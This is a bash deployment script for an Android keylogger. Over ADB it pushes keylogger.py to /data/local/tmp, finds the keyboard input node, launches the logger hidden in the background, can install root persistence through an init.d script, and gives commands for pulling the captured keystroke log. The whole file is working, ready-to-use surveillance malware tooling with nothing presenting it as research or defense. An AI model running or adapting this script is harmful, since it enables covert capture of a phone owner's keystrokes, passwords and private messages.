#!/usr/bin/env bash
# =============================================================
# deploy.sh — Full payload deployment to Android device via ADB
# =============================================================
# What this does:
#   1. Checks adb + device connectivity
#   2. Detects best input event node
#   3. Pushes keylogger.py to /data/local/tmp/ on device
#   4. Starts keylogger in background on device (via nohup)
#   5. Optionally sets up persistence via init.d or app_process
# =============================================================

set -euo pipefail

# ── Config ────────────────────────────────────────────────────
SERIAL=""                              # leave empty for single device
REMOTE_DIR="/data/local/tmp"
REMOTE_SCRIPT="${REMOTE_DIR}/keylogger.py"
REMOTE_LOG="${REMOTE_DIR}/kl.txt"
LOCAL_LOG="./kl_exfil.txt"
EXFIL_INTERVAL=60                      # seconds between auto-pulls (0=off)
PERSIST=0                              # set to 1 to install persistence
# ─────────────────────────────────────────────────────────────

ADB="adb"
[[ -n "$SERIAL" ]] && ADB="adb -s $SERIAL"

log()  { echo -e "\e[32m[+]\e[0m $*"; }
warn() { echo -e "\e[33m[!]\e[0m $*"; }
die()  { echo -e "\e[31m[-]\e[0m $*"; exit 1; }

# ── 1. Check ADB ──────────────────────────────────────────────
command -v adb &>/dev/null || die "adb not found in PATH"

log "Waiting for device..."
$ADB wait-for-device
log "Device ready."

# Print device info
MODEL=$($ADB shell getprop ro.product.model 2>/dev/null | tr -d '\r')
ANDROID=$($ADB shell getprop ro.build.version.release 2>/dev/null | tr -d '\r')
log "Target: $MODEL (Android $ANDROID)"

# ── 2. Detect event node ──────────────────────────────────────
log "Detecting input event node..."
EVENT_NODE=$($ADB shell '
  awk '"'"'
    /^H:/ { handlers=$0 }
    /^B: EV=/ {
      ev=strtonum("0x" $3)
      if (and(ev, 2)) {  # bit 1 = EV_KEY
        n=split(handlers, a, " ")
        for(i=1;i<=n;i++) {
          if (a[i] ~ /^event[0-9]/) {
            print "/dev/input/" a[i]
            exit
          }
        }
      }
    }
  '"'"' /proc/bus/input/devices
' 2>/dev/null | tr -d '\r')

if [[ -z "$EVENT_NODE" ]]; then
    warn "Could not detect event node, falling back to /dev/input/event0"
    EVENT_NODE="/dev/input/event0"
fi
log "Using event node: $EVENT_NODE"

# ── 3. Push keylogger.py ──────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
log "Pushing keylogger.py to device..."
$ADB push "${SCRIPT_DIR}/keylogger.py" "$REMOTE_SCRIPT"
$ADB shell chmod 755 "$REMOTE_SCRIPT"
log "Pushed: $REMOTE_SCRIPT"

# ── 4. Check Python on device ─────────────────────────────────
PYTHON=$($ADB shell 'command -v python3 || command -v python || echo ""' | tr -d '\r')
if [[ -z "$PYTHON" ]]; then
    warn "Python not found on device — trying to use the bundled launcher"
    # Fallback: use the shell-based reader (see keylogger_sh.sh)
    $ADB shell "nohup sh ${REMOTE_DIR}/keylogger_sh.sh > /dev/null 2>&1 &"
    log "Shell-based keylogger started."
else
    log "Python found: $PYTHON"
    # ── 5. Launch keylogger in background ─────────────────────
    EVENT_ARG=$(basename "$EVENT_NODE")
    $ADB shell "nohup $PYTHON $REMOTE_SCRIPT \
        --event $EVENT_ARG \
        --out $REMOTE_LOG \
        --exfil 0 \
        > ${REMOTE_DIR}/kl_stdout.txt 2>&1 &"
    log "Keylogger started in background (PID logged to kl_stdout.txt)"
fi

# ── 6. Persistence (optional) ────────────────────────────────
if [[ "$PERSIST" -eq 1 ]]; then
    log "Installing persistence..."
    # Try init.d (requires root)
    INIT_SCRIPT="/etc/init.d/99keylogger"
    $ADB shell su -c "echo '#!/system/bin/sh' > $INIT_SCRIPT && \
        echo '$PYTHON $REMOTE_SCRIPT --event $(basename $EVENT_NODE) --out $REMOTE_LOG --exfil 0 &' >> $INIT_SCRIPT && \
        chmod 755 $INIT_SCRIPT" 2>/dev/null && \
        log "Persistence installed via init.d" || \
        warn "init.d persistence failed (no root?). Skipping."
fi

# ── 7. Verify running ─────────────────────────────────────────
sleep 2
PID=$($ADB shell 'ps -A 2>/dev/null || ps' | grep -E 'keylogger|python' | grep -v grep | awk '{print $2}' | head -1 | tr -d '\r')
if [[ -n "$PID" ]]; then
    log "Keylogger running — PID: $PID"
else
    warn "Could not confirm process running. Check ${REMOTE_DIR}/kl_stdout.txt"
fi

log "Done. To pull logs manually:"
echo "  adb pull $REMOTE_LOG $LOCAL_LOG"
echo ""
log "To stop keylogger:"
echo "  adb shell kill $PID"
